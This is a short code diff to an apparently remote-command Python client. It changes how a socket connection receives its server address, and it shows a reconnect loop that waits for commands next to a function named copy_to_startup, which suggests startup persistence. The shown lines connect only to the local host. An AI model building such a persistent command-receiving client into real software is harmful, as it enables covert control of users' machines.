@@ -10,10 +10,10 @@ class Socket:
     established = False
     cmd_received = False
 
-    def connect_to_server(self):
+    def connect_to_server(self, ip_address, port):
         try:
             self.active_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.active_socket.connect((socket.gethostname(), 20000))
+            self.active_socket.connect((ip_address, port))
             self.established = True
             print("Connection established")
         except (ConnectionRefusedError, TimeoutError, socket.error):
@@ -115,6 +115,6 @@ def copy_to_startup(file_name):
 connection = Socket()
 while True:
     if not connection.established:
-        connection.connect_to_server()
+        connection.connect_to_server(socket.gethostname(), 20000)
     while connection.established:
         connection.receive_command()
